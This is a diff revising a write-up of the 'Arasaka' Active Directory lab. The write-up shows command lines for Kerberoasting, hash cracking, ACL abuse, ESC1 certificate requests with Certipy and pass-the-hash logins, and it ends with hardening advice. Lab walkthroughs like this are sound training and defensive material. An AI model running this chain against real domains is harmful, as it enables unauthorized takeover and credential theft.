@@ -11,7 +11,7 @@ cover:
   hidden: true
 ---
 
-In this walkthrough, we will be compromising Arasaka, an easy-difficulty Active Directory lab from Hack Smarter Labs. The engagement is an assumed breach starting with valid credentials for the standard domain user `faraday`. Kerberoasting recovers a crackable hash for `alt.svc`, which holds `GenericAll` over `Yorinobu` and lets us reset that password once a Targeted Kerberoast comes back uncrackable. `Yorinobu` holds `GenericWrite` over `Soulkiller.svc`, and a second Targeted Kerberoast recovers that password. `Soulkiller.svc` has enrollment rights on the `AI_Takeover` template, which Certipy flags as ESC1. Our first attempt to authenticate as `Administrator` fails on an expired password, so we pivot to a second Domain Administrator, `the_emperor`, and dump the NTDS to extract the `Administrator` hash for full domain compromise.
+In this walkthrough, we will be compromising Arasaka, an easy-difficulty Active Directory lab from Hack Smarter Labs. The engagement is an assumed breach starting with valid credentials for the standard domain user `faraday`. Kerberoasting recovers a crackable hash for `alt.svc`, which holds `GenericAll` over `Yorinobu` and lets us reset that password once a Targeted Kerberoast comes back uncrackable. `Yorinobu` holds `GenericWrite` over `Soulkiller.svc`, and a second Targeted Kerberoast recovers that password. `Soulkiller.svc` has enrollment rights on a template Certipy flags as ESC1. Authenticating as `Administrator` fails on an expired password, so we pivot to a second Domain Administrator, `the_emperor`, and dump the NTDS for the `Administrator` hash.
 
 ![Arasaka machine card](images/machine-card.png)
 
@@ -37,7 +37,7 @@ faraday:hacksmarter123
 
 ## RustScan
 
-We start with RustScan to find the open ports quickly. It hands them straight to Nmap, which identifies the services and pulls their details.
+We start with RustScan to find the open ports quickly. It hands them straight to Nmap, which identifies service versions with `-sV` and runs the default script set with `-sC` to pull banners, certificates, and other details.
 
 ```
 rustscan -a 10.0.21.50 -- -sC -sV
@@ -166,7 +166,7 @@ SMB         10.0.21.50    445    DC01             SYSVOL          READ          
 
 *Validating faraday credentials with NetExec*
 
-Credentials are valid, with the standard shares and nothing worth pulling from them. READ on `IPC$` lets us enumerate domain users.
+Credentials are valid, with READ on `IPC$` and the two standard logon shares. `IPC$` is what lets us enumerate domain users.
 
 ```
 nxc smb hacksmarter.local -u 'faraday' -p 'hacksmarter123' --users
@@ -221,7 +221,7 @@ LDAP        10.0.21.50    389    DC01             $krb5tgs$23$*alt.svc$HACKSMART
 
 *Kerberoasting: alt.svc TGS hash captured via NetExec*
 
-`alt.svc` has an SPN set and we capture its TGS hash. NetExec writes it to `output.txt` and we crack it with Hashcat.
+`alt.svc` has an SPN set and we capture its TGS hash. NetExec writes it to `output.txt` and we crack it with Hashcat, which reads the mode off the hash prefix. `$krb5tgs$` is mode 13100.
 
 ```
 hashcat output.txt /usr/share/wordlists/rockyou.txt
@@ -262,7 +262,7 @@ Credentials confirmed, with the same share access as before.
 
 ## BloodHound Enumeration
 
-We point NetExec at the DC for DNS with `--dns-server` so the collector can resolve the domain records it asks for.
+Cracking a service account only matters if it leads somewhere, so we follow the [AD mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/) to domain mapping and see where `alt.svc` goes. We point NetExec at the DC for DNS with `--dns-server` so the collector can resolve the domain records it asks for.
 
 ```
 nxc ldap hacksmarter.local -u 'alt.svc' -p 'babygirl1' --bloodhound --collection All --dns-server 10.0.21.50
@@ -305,7 +305,7 @@ $krb5tgs$23$*Yorinobu$HACKSMARTER.LOCAL$hacksmarter.local/Yorinobu*$5c802e04ddce
 
 *Targeted Kerberoast: SPN set on Yorinobu and TGS hash captured*
 
-The tool roasts every SPN account it can reach, but the hash we want is `Yorinobu`. We drop it into `yorinobu_hash.txt` and try Hashcat.
+The tool roasts every SPN account it can reach, but we want `Yorinobu`. We drop that hash into `yorinobu_hash.txt` and try Hashcat.
 
 ```
 hashcat yorinobu_hash.txt /usr/share/wordlists/rockyou.txt
@@ -510,7 +510,7 @@ Certipy flags ESC1 on the `AI_Takeover` template. The CA is `hacksmarter-DC01-CA
 
 ## Access as the_emperor
 
-ESC1 is a template misconfiguration where the requester can specify an arbitrary identity in the Subject Alternative Name and the template includes a client authentication EKU. A user with enrollment rights can request a certificate naming any UPN, including a domain admin, and the CA issues it without manager approval. We then authenticate as that user via PKINIT, the Kerberos extension that lets a certificate stand in for a password.
+[ESC1](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) is a template misconfiguration where the requester can specify an arbitrary identity in the Subject Alternative Name and the template includes a client authentication EKU. A user with enrollment rights can request a certificate naming any UPN, including a domain admin, and the CA issues it without manager approval. We then authenticate as that user via PKINIT, the Kerberos extension that lets a certificate stand in for a password.
 
 We request a certificate as `Administrator`, taking the SID off the Administrator object in BloodHound under the Object Information tab. `-sid` puts the target SID in the Subject Alternative Name so a current DC maps the certificate to the right account.
 
@@ -560,7 +560,7 @@ This one fails on `KDC_ERR_KEY_EXPIRED`. The certificate proves our identity, bu
 
 *BloodHound showing the Domain Admins group members: Administrator and the_emperor*
 
-There are two Domain Administrators. We run the same request against `the_emperor`.
+Two Domain Administrators. We run the same request against `the_emperor`.
 
 ```
 certipy-ad req -u 'soulkiller.svc' -p 'MYpassword123#' -dc-ip '10.0.21.50' -target 'dc01.hacksmarter.local' -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'the_emperor@hacksmarter.local' -sid 'S-1-5-21-3154413470-3340737026-2748725799-1601'
@@ -580,7 +580,7 @@ certipy-ad req -u 'soulkiller.svc' -p 'MYpassword123#' -dc-ip '10.0.21.50' -targ
 
 *Certipy requesting a certificate as the_emperor via ESC1*
 
-We get a valid PFX. Now we authenticate and pull the hash.
+We get a valid PFX, then authenticate and pull the hash.
 
 ```
 certipy-ad auth -pfx 'the_emperor.pfx' -dc-ip '10.0.21.50'
@@ -608,7 +608,7 @@ Nothing in `the_emperor`'s password state blocks the KDC this time, so the TGT c
 
 ## Shell as the_emperor
 
-Both RDP and WinRM are available on the DC, so we connect with Evil-WinRM using the hash. NTLM authenticates with the hash itself, so there is nothing left to crack.
+We connect with Evil-WinRM using the hash. NTLM authenticates with the hash itself, so there is nothing left to crack.
 
 ```
 evil-winrm -i 10.0.21.50 -u 'the_emperor' -H 'd87640b0d83dc7f90f5f30bd6789b133'
@@ -662,8 +662,8 @@ We grab `root.txt` from the Administrator's desktop and the domain is fully comp
 
 ## Final Thoughts
 
-I did not expect the first PKINIT attempt to come back `KDC_ERR_KEY_EXPIRED`. A certificate that proves identity perfectly still gets nothing if the account behind it has an expired password, and that sent me back to the graph looking for a second Domain Administrator rather than at the template. Watching the same hash work over WinRM minutes later made the distinction stick.
+I did not expect the first PKINIT attempt to come back `KDC_ERR_KEY_EXPIRED`. A certificate that proves identity perfectly still gets nothing if the account behind it has an expired password, so I went back to the graph for a second Domain Administrator. Watching the same hash work over WinRM minutes later made the distinction stick.
 
-Service accounts with SPNs belong on gMSA so a roasted ticket produces nothing crackable, since two of these hops started with a cracked hash. `GenericAll` and `GenericWrite` need auditing on a schedule, since each granted little alone and the chain came from stacking them. `AI_Takeover` turned one account's enrollment rights into a certificate for any account in the domain. And a stale built-in Administrator bought nothing while a live Domain Admin sat beside it, which is an argument for keeping that group as small as anyone can stand.
+Two of these hops started with a cracked service account password. Service accounts with SPNs belong on gMSA or a PAM-managed password, so a roasted ticket produces nothing crackable. `GenericAll` and `GenericWrite` each granted little alone. Object-level rights like these need auditing on a schedule rather than at build time. `AI_Takeover` is where that ended: a template with `Enrollee Supplies Subject` enabled turns one account's enrollment rights into a certificate for any account in the domain. And a stale built-in Administrator bought nothing with a live Domain Admin beside it.
 
 — 0xB1rd
